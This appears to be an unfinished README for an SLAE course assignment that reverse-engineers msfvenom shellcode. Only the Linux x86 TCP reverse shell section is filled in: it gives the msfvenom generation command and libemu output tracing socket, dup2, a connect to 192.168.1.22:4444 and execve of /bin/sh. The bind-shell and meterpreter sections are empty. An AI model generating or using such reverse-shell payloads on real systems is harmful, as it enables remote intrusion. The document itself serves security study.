# SLAE course
This course can be found here:
[Link to course](https://www.pentesteracademy.com/course?id=3)

## Assignment#5: What to do ?
For this assignment we have to:
* Take up to three shellcodes examples created by Msfvenom
* Use a disassembler like GDB/Ndisasm/Libemu to reverse them
* Present the analysis 

## Introduction:
In order to do this assignment, I decided to divide the presentation of each shellcodes in 3 parts:
1) The first part which show and explain the assembly code generated by msfvenom.
2) The second part which show and explain the C pseudo code generated by Libemu.
3) The final part which contains a more high level review (a graph generated by libemu too) of the shellcode.

Now, let's get to work.
=

## 1) First shellcode: a tcp reverse shell
### 1.1) First part: the assembly 
The first shellcode, I decided to analyse, is a tcp reverse shell. This shellcode can be generated using msfvenom:
```console
#msfvenom -p linux/x86/shell_reverse_tcp -f elf -o reverse_shell 
``` 

We will use IDA to understand how the assembly of this shellcode works:
<p align="center">
![ida_reverse_shell](https://github.com/RomainLanglois/Shellcode/blob/master/SLAE/assignment5/IDA_reverse_shell.png)
</p>
Based on the above code, we can divide this code in differents shellcode:

1) ...
2) ...

### 1.2) The second part: the C pseudo code
The C pseudo Code:
```console
msfvenom -p linux/x86/shell_reverse_tcp -f raw | ./sctest -vvv -Ss 100000

...
...
...

int socket (
     int domain = 2;
     int type = 1;
     int protocol = 0;
) =  14;
int dup2 (
     int oldfd = 14;
     int newfd = 2;
) =  2;
int dup2 (
     int oldfd = 14;
     int newfd = 1;
) =  1;
int dup2 (
     int oldfd = 14;
     int newfd = 0;
) =  0;
int connect (
     int sockfd = 14;
     struct sockaddr_in * serv_addr = 0x00416fbe => 
         struct   = {
             short sin_family = 2;
             unsigned short sin_port = 23569 (port=4444);
             struct in_addr sin_addr = {
                 unsigned long s_addr = 369207488 (host=192.168.1.22);
             };
             char sin_zero = "       ";
         };
     int addrlen = 102;
) =  0;
int execve (
     const char * dateiname = 0x00416fa6 => 
           = "//bin/sh";
     const char * argv[] = [
           = 0x00416f9e => 
               = 0x00416fa6 => 
                   = "//bin/sh";
           = 0x00000000 => 
             none;
     ];
     const char * envp[] = 0x00000000 => 
         none;
) =  0;
```

### 1.3) The third part: a graphical view
The final part is to create a more user friendly view of this shellcode (we will use libemu to do that):
```console
#msfvenom -p linux/x86/shell_reverse_tcp -f raw | ./sctest -vvv -Ss 100000 -G reverse_shell.dot
#dot reverse_shell.dot -T png -o reverse_shell.png
```
Here is a graphical view of the reverse shell code:
<p align="center">
![graph_reverse_shell](https://github.com/RomainLanglois/Shellcode/blob/master/SLAE/assignment5/reverse_shell.png)
</p>

## 2) Second shellcode: a tcp bind shell
### 2.1) First part: the assembly 

### 2.2) The second part: the C pseudo code

### 2.3) The third part: a graphical view


## 3) Third shellcode: a meterpreter reverse tcp (stageless)
### 3.1) First part: the assembly 

### 3.2) The second part: the C pseudo code

### 3.3) 'The third part: a graphical view